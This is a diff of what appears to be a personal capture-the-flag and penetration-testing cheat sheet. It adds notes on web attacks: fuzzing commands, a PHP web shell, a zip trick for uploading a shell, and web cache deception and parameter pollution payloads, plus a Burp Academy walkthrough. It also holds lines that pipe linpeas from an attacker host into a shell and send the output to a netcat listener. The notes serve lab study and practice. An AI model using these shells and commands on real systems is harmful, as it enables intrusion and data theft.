@@ -8,7 +8,7 @@ exegol start -cwd -fs --disable-shared-timezones CTF2
 
 <details>
 
-Command for obtimal informations :
+Command for optimal informations :
 
 ```bash
 nmap -Pn -sC -sV -p- -T4 -vvvv --reason "$TARGET"
@@ -32,7 +32,15 @@ Fuzz for pages :
 
 Fuzz for subdomain using the header host :
 
-`ffuf -c -w /opt/seclists/Discovery/Web-Content/list_of_ports.txt -u "http://$TARGET/" -H "X-Forwarded-For: FUZZ"`
+`ffuf -c -w /opt/seclists/Discovery/Web-Content/list_of_ports.txt -u "http://$TARGET/" -H "Host: FUZZ.$TARGET"`
+
+Fuzz for username (use the regex):
+
+`ffuf -c -w ./usernames.txt  -X POST -d "username=FUZZ&password=test" -u "http://$TARGET/login" -fr "Invalid username"`
+
+Fuzz for IP in SSRF :
+
+`ffuf -c -u "$TARGET" -X POST -d "stockApi=http://192.168.0.FUZZ:8080/admin" -w <(seq 1 1 254) -mc 200`
 
 To avoid false positive, use of filters :
 
@@ -78,6 +86,101 @@ curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
 ## Web
 
 <details>
+
+don't forget to check the source code and config files, you can easily find some passwords !
+
+### PHP
+
+#### Basic Web Shell
+
+It's important to upload a file in <name>.php, otherwhile the system don't know how to interpret it.
+
+`<?php echo system($_GET['command']); ?>`
+
+### OS Command Injection
+
+Purpose of command 	Linux 	Windows
+Name of current user 	whoami 	whoami
+Operating system 	uname -a 	ver
+Network configuration 	ifconfig 	ipconfig /all
+Network connections 	netstat -an 	netstat -an
+Running processes 	ps -ef 	tasklist
+
+### HTTP parameter pollution (HPP)
+
+Place query syntax characters like #, &, and = in your input and observe if they are encoded. If not, you might be able to replace some of the values.
+
+Example :
+
+```html
+In the browser :
+http://thebank.com/?to=Jake&amount=10
+In the backend it became :
+http://payement-gateway/?from=Attacker&to=Jake&amount=10 # the "from" is completed from the cookies.
+
+We could abuse it like this :
+http://thebank.com/?to=Jake&amount=10&from=Jake&to=Attacker
+And because there is no encoding on amount, we could use our own parameters, the request in the backend will be :
+http://payement-gateway/?from=Attacker&to=Jake&amount=10&from=Jake&to=Attacker
+Thus, overriding the initial values of from and to
+```
+
+Example from burp academy
+
+```
+csrf=MrqMucWb11wmtIh7glu4wdLETarkxqaJ&username=administrator%23
+=> field not specified, donc fuzz dessus :
+
+ffuf -c -u https://0a6800d004ec92128054b751001e0047.web-security-academy.net/forgot-password -b "session=aENquR6wuMy69m6kT9qkFEpVtnDbMRVU" -H 'Content-Type: x-www-form-urlencoded' -d "csrf=MrqMucWb11wmtIh7glu4wdLETarkxqaJ&username=administrator%26field=FUZZ%23" -w /opt/seclists/burp-payloads/Server-side\ variable\ names.pay
+
+username
+email
+
+On en trouve un autre dans forgetPassword.js : reset_password, donc on le test :
+
+csrf=a6tfWRTMm5uY9fnowZ7M6Km54l168HPm&username=administrator%26field=reset_token%23
+
+{"type":"reset_token","result":"mrlhusvq051z33yc0jzx6qmla862wfhb"}
+
+Maintenant on visite la page ds le browser et on accès au form (tel que le fichier .js l'explique)
+
+https://0a6800d004ec92128054b751001e0047.web-security-academy.net/forgot-password?reset_token=o6lcow5jd6zb3i994vq6vn1talfema4n
+```
+
+### CSRF
+In a successful CSRF attack, the attacker causes the victim user to carry out an action unintentionally.
+
+### SSRF
+
+Bypass filters
+127.0.0.1 can be simplified as 127.1
+
+You can also use double URL Encoding
+
+### Web cache deception
+
+Send a malicious URL and have the cache storing a dynamic response. You can then send a request to get the content of this precise data.
+
+Mostly on `HEAD`, `GET` and `OPTION`. `X-Cache` header provides information about whether a response was served from the cache.
+
+If update `/api/my-account/foo` to `/api/my-account/foo.js` still send the same the same information, and that pages in `.js` are cached, you can have the victim to visit the page, it will be cached and you can then get the content of this page.
+
+```js
+<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
+```
+
+To go even further, consider the payload `/settings/users/list;aaa.js`. The origin server uses `;` as a delimiter. The cache interprets the path as: `/settings/users/list;aaa.js`. The origin server interprets the path as: `/settings/users/list`.
+
+To go even further. consider the example `/myaccount%3fwcd.css`:
+- The cache server applies the cache rules based on the encoded path `/myaccount%3fwcd.css` and decides to store the response as there is a cache rule for the .css extension. It then decodes `%3f` to `?` and forwards the rewritten request to the origin server.
+- The origin server receives the request `/myaccount?wcd.css`. It uses the `?` character as a delimiter, so it interprets the path as `/myaccount`.
+
+Make sure that you also test encoded non-printable characters, particularly %00, %0A and %09.
+
+```js
+<script>document.location="https://0a300087043a4726b4b29a3e00230012.web-security-academy.net//my-account%23%2f%2e%2e%2fresources"</script>
+```
+
 
 ### JS
 
@@ -173,6 +276,46 @@ cd git-dump
 git reset --hard HEAD
 ```
 
+### API
+
+```
+    /api
+    /swagger/index.html
+    /openapi.json
+```
+
+#### Parameter pollution
+
+In a query, `#` (or `%23`) refers to section. So everything after it is not interpeted by the browser. This means that you could delete some part of the original request and replace it with your own.
+
+You can discover some hidden parameter :
+
+- Request : username=admin%23
+- Response : field is not specified
+
+This means, that the server is waiting for a field parameter, you can then bruteforce to find this parameter
+
+### File Upload
+
+#### zip slip (not the good name)
+
+> double check the name
+
+combine both good and malicious pdf :
+
+```
+nano legit.pdf
+zip legit.zip legit.pdf
+
+mkdir malicious_files
+echo '<php system($_GET["cmd"]); ?>' > malicious_files/shell.php
+zip -r malicious.zip malicious_files
+
+cat legit.zip malicious.zip > both.zip
+```
+
+Then upload `both.pdf`, go on the url `legit.pdf`, the switch to `malicious_files/shell.php`.
+
 </details>
 
 ## Linux
@@ -189,8 +332,8 @@ swaks --to jobert@localhost --from axel@localhost --header "Subject: Exploit" --
 
 ```bash
 # Host on two sparate terminal
-python3 -m http.server 8000
-nc -lvnp 9002 | tee linpeas.out
+python3 -m http.server 8000 > /dev/null |
+nc -lvnp 9002 | tee <bos_name>/linpeas.out
 
 # Victim
 curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
@@ -379,6 +522,9 @@ If issue of time:
 ```bash
 faketime "$(rdate -n $DC_IP -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh
 ```
+
+### UPN changement
+
 
 ## Amazing reverse shell
 
